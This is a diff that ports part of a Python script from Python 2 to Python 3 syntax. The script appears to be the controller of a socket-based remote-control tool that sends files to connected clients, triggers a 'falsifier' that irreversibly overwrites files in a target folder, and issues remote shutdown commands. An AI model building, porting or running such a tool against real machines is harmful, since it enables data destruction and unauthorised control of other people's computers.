@@ -26,25 +26,25 @@ def falsifier(target,conn):
             
         conn.send("Falsification Complete.")
             
-    except Exception, e:
+    except Exception as e:
         conn.send(str(e))
         pass
     
 def perm_falsifier(conn):
     
-    print "Aknowledged. Now Send The Target."
-    perm = raw_input("""\nWarning - Any Changes Made To The Files Will Not Be Reverted.
+    print("Aknowledged. Now Send The Target.")
+    perm = input("""\nWarning - Any Changes Made To The Files Will Not Be Reverted.
           Also Any Non-Text File Will Be Corrupted.
           Are You Sure You Want To Continue ?(Y/N) - """)
     if perm == "Y" or perm == "y":
-        target = raw_input("Enter The Target Folder : ")
+        target = input("Enter The Target Folder : ")
         conn.send("Incoming Target.")
         conn.send(target)
     else:
         pass
         
 def sendfile():
-        filename = raw_input("Enter The File Path : ")
+        filename = input("Enter The File Path : ")
         user_file = open(filename,'r+')
         read_file = user_file.read()
         return read_file
@@ -55,17 +55,17 @@ def commands(server_prompt, conn,s):
         try:
             usrfile = sendfile()
             conn.send("\n" + usrfile)
-        except Exception, e:
-            print "Error : " + str(e)
+        except Exception as e:
+            print(f"Error : {str(e)}")
     elif server_prompt == "<exit>":
-        print "See Ya, Houstan !"
+        print("See Ya, Houstan !")
         s.close()
-        print "-"*60
+        print("-"*60)
         sys.exit()
     elif server_prompt == "<sys shutdown>":
-        print "See Ya, Houstan !"
+        print("See Ya, Houstan !")
         s.close()
-        print "-"*60
+        print("-"*60)
         sys.exit()
         os.system("shutdown -s -t 2")
     elif server_prompt == "<terminal>":
@@ -73,7 +73,7 @@ def commands(server_prompt, conn,s):
     elif server_prompt == "<ipconfig>":
         os.system("ipconfig")
     elif server_prompt == "<remote shutdown>":
-        target = raw_input("Target : ")
+        target = input("Target : ")
         if target == "client":
             for sock in connlist:            
                 target = sock
@@ -82,7 +82,7 @@ def commands(server_prompt, conn,s):
         os.system("telnet towel.blinkenlights.nl.")
     elif server_prompt == "~help~":
         filename = open("Help.txt","r+")
-        print filename.read()
+        print(filename.read())
     elif server_prompt == "<launch falsifier>":
         perm_falsifier(conn)
     else:
